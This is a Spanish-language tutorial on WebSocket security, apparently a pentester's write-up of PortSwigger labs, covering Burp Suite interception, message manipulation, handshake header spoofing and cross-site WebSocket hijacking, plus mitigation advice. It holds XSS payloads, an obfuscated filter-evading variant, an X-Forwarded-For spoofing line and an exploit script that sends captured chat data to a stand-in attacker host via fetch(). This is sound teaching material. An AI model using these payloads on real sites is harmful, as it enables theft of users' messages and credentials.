---
title: "Hacking Web Socket"
description: "Guía completa sobre vulnerabilidades en WebSockets, técnicas de explotación y laboratorios prácticos de PortSwigger para mejorar la seguridad en comunicaciones bidireccionales en tiempo real."
showBreadcrumbs: true
showTableOfContents: false
---

# Hacking Web Socket

## Definición y Ejemplos

Los WebSockets son un protocolo de comunicación bidireccional que proporciona un canal de comunicación persistente entre un cliente y un servidor sobre una única conexión TCP. A diferencia de HTTP, que sigue un modelo de solicitud-respuesta, WebSockets permiten una comunicación full-duplex donde tanto el cliente como el servidor pueden enviar mensajes independientemente en cualquier momento.

**Características principales:**
- Conexión persistente (no es necesario reconectar)
- Comunicación bidireccional en tiempo real
- Menor overhead de datos comparado con polling HTTP
- Utiliza el protocolo `ws://` o `wss://` (WebSocket seguro)

**Ejemplo de establecimiento de conexión WebSocket en JavaScript:**

```javascript
// Crear una conexión WebSocket
const socket = new WebSocket('wss://ejemplo.com/socket');

// Eventos para manejar la conexión
socket.onopen = function(event) {
  console.log('Conexión establecida');
  socket.send('Hola servidor!');
};

socket.onmessage = function(event) {
  console.log('Mensaje recibido:', event.data);
};

socket.onclose = function(event) {
  console.log('Conexión cerrada');
};

socket.onerror = function(error) {
  console.log('Error:', error);
};
```

## Uso de Burp Suite para Pruebas en WebSockets

Burp Suite es una herramienta esencial para probar la seguridad de aplicaciones que utilizan WebSockets. Permite interceptar, inspeccionar y modificar los mensajes que se intercambian entre el cliente y el servidor.

### Configuración básica:

1. **Configuración del navegador:** Asegúrate de que tu navegador esté configurado para usar Burp Suite como proxy (generalmente 127.0.0.1:8080).

2. **Interceptación de WebSockets:**
   - Ve a la pestaña "Proxy" > "Intercept" y activa la opción "Intercept is on"
   - Para ver las conexiones WebSocket activas, dirígete a "Proxy" > "WebSockets history"

3. **Manipulación de mensajes:**
   - Puedes modificar mensajes en tiempo real desde la pestaña "Intercept"
   - También puedes enviar mensajes a otras herramientas de Burp (Repeater, Intruder, etc.)

4. **Uso de WebSocket Repeater:**
   - Envía cualquier mensaje WebSocket al Repeater para modificarlo y reenviarlo
   - Permite probar diferentes payloads y observar respuestas sin necesidad de interactuar con la aplicación web

### Ejemplo de modificación de mensaje en Burp:

1. Intercepta un mensaje WebSocket
2. Modifica el contenido (por ejemplo, añadiendo una carga XSS)
3. Haz clic en "Forward" para enviar el mensaje modificado al servidor

## Vulnerabilidades y Ataques Comunes

### Manipulación de Mensajes WebSocket

En este laboratorio de PortSwigger se demuestra cómo se puede abusar del canal de comunicación WebSocket para introducir cargas maliciosas que no pasan por los filtros del navegador.

La aplicación cuenta con un chat en tiempo real gestionado por WebSockets. Al enviar un mensaje desde el navegador, observamos que el cliente aplica una codificación automática para evitar ataques. Sin embargo, al interceptar el mensaje desde una herramienta como Burp y modificarlo manualmente antes de que llegue al servidor, conseguimos insertar una carga que, al ser procesada por el navegador del agente de soporte, genera una ejecución no deseada.

Esta técnica pone de manifiesto la importancia de validar los mensajes en el servidor, ya que las protecciones del cliente pueden ser fácilmente eludidas. El laboratorio se completa cuando logramos que la carga manipulada sea procesada por el navegador del agente, confirmando la existencia de la vulnerabilidad.

#### Paso a paso para explotar:

1. Interceptar el mensaje WebSocket con Burp Suite
2. Modificar el contenido para incluir una carga XSS: `<img src=x onerror='alert(1)'>`
3. Enviar el mensaje modificado al servidor
4. El agente de soporte recibe el mensaje y la carga XSS se ejecuta en su navegador

### Secuestro de WebSocket entre Sitios (Cross-Site WebSocket Hijacking)

Este laboratorio presenta un escenario en el que un canal WebSocket se encuentra mal protegido, permitiendo que un atacante pueda establecer una conexión maliciosa desde otro dominio y extraer información sensible.

La aplicación incorpora un sistema de chat que utiliza WebSockets para gestionar la comunicación. Analizando la interacción con el servidor, identificamos que no existen medidas de protección contra peticiones cruzadas (como tokens CSRF o validación de origen), lo que abre la puerta a un ataque de tipo cross-site WebSocket hijacking.

El atacante construye un payload malicioso en una página controlada, capaz de establecer la conexión WebSocket directamente con el servidor del chat. Desde ahí, simula el comportamiento legítimo del cliente, solicitando el historial de conversación. Una vez recuperados los mensajes, estos se reenvían a un servidor externo (como Burp Collaborator) para su análisis.

#### Ejemplo de exploit para CSWSH:

```html
<script>
  var socket = new WebSocket('wss://vulnerable-site.com/chat');
  
  socket.onopen = function() {
    socket.send('READY');  // Iniciar la conexión
  };
  
  socket.onmessage = function(event) {
    fetch('https://attackers-server.com/collect?data=' + encodeURIComponent(event.data));
  };
</script>
```

El laboratorio se resuelve cuando logramos obtener, entre los mensajes de la víctima, sus credenciales de acceso, y las usamos para iniciar sesión en su cuenta. Esto demuestra cómo una falta de validaciones en el establecimiento de conexiones WebSocket puede comprometer la seguridad de los usuarios.

### Manipulación del Handshake de WebSocket

Este laboratorio presenta un escenario en el que una tienda online utiliza WebSockets para su sistema de chat en tiempo real. Sin embargo, la implementación contiene una lógica de filtrado de XSS defectuosa que puede ser sorteada con técnicas de evasión.

Durante la interacción con el chat, se descubre que al enviar una carga maliciosa clásica, la conexión WebSocket se termina inmediatamente y el servidor bloquea la IP del cliente. Sin embargo, este mecanismo puede ser eludido modificando la cabecera del handshake para falsificar la dirección IP mediante un encabezado específico.

Una vez restablecida la conexión usando esta técnica, se puede enviar una versión ofuscada de una carga XSS que pasa por alto el filtro del servidor. Dicha carga es ejecutada por el navegador del agente de soporte, resolviendo así el laboratorio al provocar la ejecución de un '**alert()**'.

#### Técnica de explotación:

1. Intenta enviar una carga XSS básica y observa el bloqueo
2. Modifica el handshake WebSocket para incluir una cabecera que falsifique tu IP:
   ```
   X-Forwarded-For: 127.0.0.1
   ```
3. Envía una carga XSS ofuscada para evadir los filtros:
   ```
   <img src=1 onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
   ```

Este ejercicio demuestra cómo una mala validación en el establecimiento de conexiones WebSocket puede ser explotada para evadir mecanismos de protección y ejecutar ataques del lado del cliente.

## Preguntas Frecuentes

### 1. ¿Qué riesgo existe si no se valida correctamente el contenido de los mensajes WebSocket?

La falta de validación adecuada en los mensajes WebSocket puede permitir la inyección de contenido malicioso como scripts XSS, comandos SQL o datos malformados. Al no implementar filtros de seguridad en el servidor, los atacantes pueden eludir las protecciones del lado del cliente e introducir cargas que pueden conducir a:

- Ejecución de código en el navegador de otros usuarios
- Robo de sesiones o datos sensibles
- Manipulación de la interfaz de usuario
- Propagación de ataques a otros usuarios de la aplicación

Es crucial implementar validación tanto en el cliente como en el servidor para mitigar estos riesgos.

### 2. ¿Qué componente se puede manipular en el handshake del WebSocket?

Durante el handshake de WebSocket (la negociación inicial de la conexión), varios componentes pueden ser manipulados:

- **Cabeceras HTTP**: Como `Origin`, `Cookie`, `X-Forwarded-For`, `User-Agent`
- **Parámetros de consulta URL**: Tokens de autenticación o parámetros de sesión
- **Protocolos WebSocket**: Mediante la cabecera `Sec-WebSocket-Protocol`
- **Extensiones WebSocket**: Mediante la cabecera `Sec-WebSocket-Extensions`

Estas manipulaciones pueden permitir evasión de restricciones, bypass de validaciones IP o suplantación de identidad.

### 3. ¿Qué permite el secuestro de WebSocket entre sitios?

El secuestro de WebSocket entre sitios (Cross-Site WebSocket Hijacking o CSWSH) permite a un atacante:

- Establecer conexiones WebSocket no autorizadas desde un dominio malicioso
- Explotar la falta de protección CSRF en el handshake WebSocket
- Acceder a información sensible del usuario autenticado
- Realizar acciones en nombre del usuario sin su conocimiento
- Extraer datos de comunicaciones privadas o chats
- Reutilizar las cookies de autenticación de la víctima para establecer conexiones legítimas

Es especialmente peligroso porque aprovecha las sesiones activas del usuario y permite una exfiltración de datos en tiempo real.

### 4. ¿Qué medida previene accesos desde otros sitios?

Para prevenir accesos WebSocket desde sitios no autorizados se pueden implementar:

- **Validación del encabezado Origin**: Verificar que la petición proviene de un dominio autorizado
- **Tokens anti-CSRF**: Incluir tokens únicos en la URL o en los parámetros del WebSocket
- **Tokens de autenticación específicos para WebSocket**: Diferentes de las cookies de sesión
- **Same-Site Cookies**: Configurar cookies con atributo SameSite=Strict
- **CORS adecuado**: Configurar correctamente las políticas de origen cruzado
- **Validación de estado y secuencia**: Verificar que la conexión sigue un flujo lógico esperado

La combinación de estas técnicas dificulta significativamente los ataques CSWSH.

### 5. ¿Cuál es el propósito principal de un WebSocket?

El propósito principal de WebSocket es proporcionar un canal de comunicación bidireccional, persistente y de baja latencia entre un cliente y un servidor. Sus objetivos fundamentales son:

- Facilitar la comunicación en tiempo real sin necesidad de polling continuo
- Reducir la sobrecarga de datos al eliminar cabeceras HTTP repetitivas
- Permitir que el servidor envíe datos al cliente sin necesidad de solicitud previa
- Mantener una única conexión TCP para múltiples intercambios de mensajes
- Soportar aplicaciones interactivas como chats, juegos en línea, paneles de datos en tiempo real y notificaciones instantáneas

WebSocket llena el vacío que existía en las comunicaciones web tradicionales, permitiendo experiencias verdaderamente interactivas y en tiempo real.


---

> *Josfull — Creador, escritor y pentester detrás de cada línea de este sitio.*